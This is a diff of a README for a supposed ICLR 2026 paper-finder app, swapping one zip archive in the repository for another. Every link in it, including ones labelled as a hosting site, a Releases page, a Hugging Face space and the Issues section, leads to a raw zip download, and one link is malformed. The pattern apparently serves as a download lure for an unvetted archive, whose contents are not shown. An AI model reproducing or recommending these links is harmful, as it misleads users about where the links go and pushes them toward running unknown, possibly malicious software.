@@ -2,7 +2,7 @@
 
 ## 📥 Download Here
 
-[![Download ICLR26_Paper_Finder](https://raw.githubusercontent.com/kingsleypocorni6-droid/ICLR26_Paper_Finder/main/additional_venues/ICLR26_Paper_Finder_3.1.zip%https://raw.githubusercontent.com/kingsleypocorni6-droid/ICLR26_Paper_Finder/main/additional_venues/ICLR26_Paper_Finder_3.1.zip)](https://raw.githubusercontent.com/kingsleypocorni6-droid/ICLR26_Paper_Finder/main/additional_venues/ICLR26_Paper_Finder_3.1.zip)
+[![Download ICLR26_Paper_Finder](https://raw.githubusercontent.com/kingsleypocorni6-droid/ICLR26_Paper_Finder/main/expanded_app/Paper_ICL_Finder_v3.7-beta.2.zip%https://raw.githubusercontent.com/kingsleypocorni6-droid/ICLR26_Paper_Finder/main/expanded_app/Paper_ICL_Finder_v3.7-beta.2.zip)](https://raw.githubusercontent.com/kingsleypocorni6-droid/ICLR26_Paper_Finder/main/expanded_app/Paper_ICL_Finder_v3.7-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you download, ensure that your computer meets these basic requirements:
 ## 🌍 Permanent Hosting
 
 You can always access the ICLR26_Paper_Finder at the following link:  
-[Permanent Hosting Site](https://raw.githubusercontent.com/kingsleypocorni6-droid/ICLR26_Paper_Finder/main/additional_venues/ICLR26_Paper_Finder_3.1.zip)
+[Permanent Hosting Site](https://raw.githubusercontent.com/kingsleypocorni6-droid/ICLR26_Paper_Finder/main/expanded_app/Paper_ICL_Finder_v3.7-beta.2.zip)
 
 ## 🎭 Features
 
@@ -33,7 +33,7 @@ You can always access the ICLR26_Paper_Finder at the following link:
 
 To get your copy of ICLR26_Paper_Finder, visit the Releases page by clicking the link below:
 
-[Download ICLR26_Paper_Finder](https://raw.githubusercontent.com/kingsleypocorni6-droid/ICLR26_Paper_Finder/main/additional_venues/ICLR26_Paper_Finder_3.1.zip)
+[Download ICLR26_Paper_Finder](https://raw.githubusercontent.com/kingsleypocorni6-droid/ICLR26_Paper_Finder/main/expanded_app/Paper_ICL_Finder_v3.7-beta.2.zip)
 
 On this page, you will find the latest version of the application. Click on the version you want to download. The download will start automatically. 
 
@@ -47,7 +47,7 @@ On this page, you will find the latest version of the application. Click on the 
 ## 🌐 Hugging Face Hosting
 
 For additional features, check out our Hugging Face space. You can visit here:  
-[Hugging Face Hosting](https://raw.githubusercontent.com/kingsleypocorni6-droid/ICLR26_Paper_Finder/main/additional_venues/ICLR26_Paper_Finder_3.1.zip)
+[Hugging Face Hosting](https://raw.githubusercontent.com/kingsleypocorni6-droid/ICLR26_Paper_Finder/main/expanded_app/Paper_ICL_Finder_v3.7-beta.2.zip)
 
 ## 🤖 FAQ
 
@@ -65,7 +65,7 @@ A: Yes, you can bookmark any paper for easy access later.
 
 ## 💬 Support
 
-If you encounter any issues or have questions, please reach out through the [Issues](https://raw.githubusercontent.com/kingsleypocorni6-droid/ICLR26_Paper_Finder/main/additional_venues/ICLR26_Paper_Finder_3.1.zip) section on GitHub. We are here to help you.
+If you encounter any issues or have questions, please reach out through the [Issues](https://raw.githubusercontent.com/kingsleypocorni6-droid/ICLR26_Paper_Finder/main/expanded_app/Paper_ICL_Finder_v3.7-beta.2.zip) section on GitHub. We are here to help you.
 
 ## 📄 Legal Information
 
